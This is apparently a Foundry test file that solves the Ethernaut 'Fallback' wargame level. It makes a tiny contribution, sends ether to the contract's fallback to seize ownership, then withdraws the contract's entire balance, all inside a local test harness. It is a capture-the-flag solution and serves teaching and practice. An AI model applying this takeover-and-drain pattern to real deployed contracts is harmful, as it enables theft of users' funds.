// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "forge-std/Test.sol";
import "../src/Ethernaut.sol";
import "../src/1-Fallback/Fallback.sol";
import "../src/1-Fallback/FallbackFactory.sol";

contract FallbackTest is Test {
    Ethernaut ethernaut;
    FallbackFactory level;
    Fallback instance;
    address player = address(123456);

    function setUp() public {
        ethernaut = new Ethernaut();
        level = new FallbackFactory();
        ethernaut.registerLevel(level);
        startHoax(player);
        address instanceAddress = ethernaut.createLevelInstance(level);
        instance = Fallback(payable(instanceAddress));
    }

    function testFallbackHack() public {
        instance.contribute{value: 1 wei}();
        (bool success, ) = payable(address(instance)).call{value: 1 wei}("");
        assertTrue(success);
        assertEq(instance.owner(), player);
        emit log_named_uint(
            "Fallback contract balance before",
            address(instance).balance
        );
        instance.withdraw();
        emit log_named_uint(
            "Fallback contract balance after",
            address(instance).balance
        );
        bool levelCompleted = ethernaut.submitLevelInstance(
            payable(address(instance))
        );
        assert(levelCompleted);
    }
}
